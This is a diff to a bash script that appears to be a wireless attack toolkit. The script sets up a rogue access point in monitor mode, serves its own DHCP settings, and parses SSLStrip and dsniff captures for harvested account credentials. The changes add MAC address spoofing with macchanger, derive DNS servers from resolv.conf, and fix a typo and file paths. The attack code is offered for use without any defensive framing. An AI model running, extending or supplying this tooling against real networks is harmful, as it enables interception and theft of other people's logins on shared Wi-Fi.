@@ -524,8 +524,20 @@ echo -e "\n\e[1;34m[*]\e[0m Your interface has now been placed in Monitor Mode\n
 airmon-ng | grep mon | sed '$a\\n'
 unset MONMODE
 while [ -z "${MONMODE}" ]; do read -p "Enter your monitor enabled interface name, (ex: mon0): " MONMODE; done
+unset VAR  
+while [[ -z "$VAR" ]]; do read -p "Macchange $MONMODE? (y/n): " VAR; done
+if [[ $VAR == y ]];then
+    while [[ -z $rand ]]; do read -p "Random MAC? (y). Or manual (m): " rand; done
+    case $rand in
+        y|Y) ifconfig $MONMODE down && macchanger -A $MONMODE && ifconfig $MONMODE up;;
+        m|M) while [ -z $ap_mac ];do read -p "Desired MAC Address for $MONMODE?: " ap_mac; done
+             ifconfig $MONMODE down && macchanger -m $ap_mac $MONMODE && ifconfig $MONMODE up;;
+    esac
+    sleep 2
+fi
 unset TUNIFACE
-while [ -z "${TUNIFACE}" ]; do read -p "Enter your tunnel interface, example at0: " TUNIFACE; done
+# while [ -z "${TUNIFACE}" ]; do read -p "Enter your tunnel interface, example at0: " TUNIFACE; done
+TUNIFACE=at0 # does it ever need to be anything else?
 read -p "Do you have a dhcpd.conf file to use? [y/N]: " DHCPFILE
 DHCPFILE=$(echo ${DHCPFILE} | tr 'A-Z' 'a-z')
 if [ "${DHCPFILE}" == "y" ]; then
@@ -607,14 +619,22 @@ f_ipcalc(){
 }
 ##################################################
 f_dhcpmanual(){
-unset ATCIDR
-while [ -z "${ATCIDR}" ]; do
-	read -p "Network range for your tunneled interface, example 10.0.0.0/24: " ATCIDR
-	if [[ ! ${ATCIDR} =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/[0-9]{1,2}$ ]]; then ATCIDR=; fi
-done
-unset ATDNS
-while [ -z "${ATDNS}" ]; do read -p "Enter the IP address for the DNS server, example 8.8.8.8: " ATDNS; done
-f_ipcalc
+        unset ATCIDR
+        while [ -z "${ATCIDR}" ]; do
+                read -p "Network range for your tunneled interface, example 10.0.0.0/24: " ATCIDR
+                if [[ ! ${ATCIDR} =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/[0-9]{1,2}$ ]]; then ATCIDR=; fi
+        done
+
+        var=$(grep "nameserver" /etc/resolv.conf | awk '{print $2}' |wc -l) # count the number of nameservers in resolv.conf
+        if [[ $var = 1 ]];then  # if 1, use it in dhcpd.conf
+          ATDNS=$(grep nameserver /etc/resolv.conf | awk '{print $2}')
+        elif [[ $var > 1 ]];then  # if more than 1 nameserver, manipulate string into an acceptable form for dhcpd.conf
+          ATDNS=$(grep nameserver /etc/resolv.conf | awk '{print $2}' | tr '\n' ',') # replace newlines with commas
+          ATDNS=${ATDNS//,/", "}                           # add a space after all commas
+          ATDNS=${ATDNS%", "}                              # delete the final comma/space
+        else ATDNS="8.8.8.8" # default in case resolv.conf is empty
+        fi
+        f_ipcalc
 }
 ##################################################
 f_dhcptunnel(){
@@ -1091,7 +1111,7 @@ fi
 
 atheroscard=$(lsmod | grep -c 'ath')
 if [ "${atheroscard}" -lt "1" ]; then
-	echo -e "\n\e[1;31m[-]\e[0m I could not find and Atheros wireless card.\nAttack only works with an atheros chipset...\n"
+	echo -e "\n\e[1;31m[-]\e[0m I could not find an Atheros wireless card.\nAttack only works with an atheros chipset...\n"
 	sleep 5
 fi
 
@@ -1247,7 +1267,7 @@ if [ -d ${logfldr} ]; then
 	fi
 fi
 
-if [ -e /${PWD}/strip-accts.txt ]; then rm /${PWD}/strip-accts.txt; fi
+if [ -e ${PWD}/strip-accts.txt ]; then rm ${PWD}/strip-accts.txt; fi
 
 unset LOGPATH
 while [ -z ${LOGPATH} ] || [ ! -f "${LOGPATH}" ]; do read -e -p "Enter the full path to your SSLStrip log file: " LOGPATH;	done
@@ -1267,7 +1287,7 @@ while [ ${i} -le "${NUMLINES}" ]; do
 	GREPSTR="$(grep -a ${VAL2} "${LOGPATH}" | grep -a ${VAL3} | grep -a ${VAL4})"
 
 	if [ "${GREPSTR}" ]; then
-		echo -n "${VAL1}" "- " >> /${PWD}/strip-accts.txt
+		echo -n "${VAL1}" "- " >> ${PWD}/strip-accts.txt
 		echo "${GREPSTR}" | \
 		sed -e 's/.*'${VAL3}'=/'${VAL3}'=/' -e 's/&/ /' -e 's/&.*//' >> ${PWD}/strip-accts.txt
 	fi
@@ -1299,7 +1319,7 @@ f_dsniff(){
 	 read -e -p "Enter the path for your dsniff Log file: " DSNIFFPATH
 	done
 
-	dsniff -r ${DSNIFFPATH} >> /${PWD}/dsniff-log.txt
+	dsniff -r ${DSNIFFPATH} >> ${PWD}/dsniff-log.txt
 	if [ -z ${isxrunning} ];then
 	 cat ${PWD}/dnsiff-log.txt | less
 	else
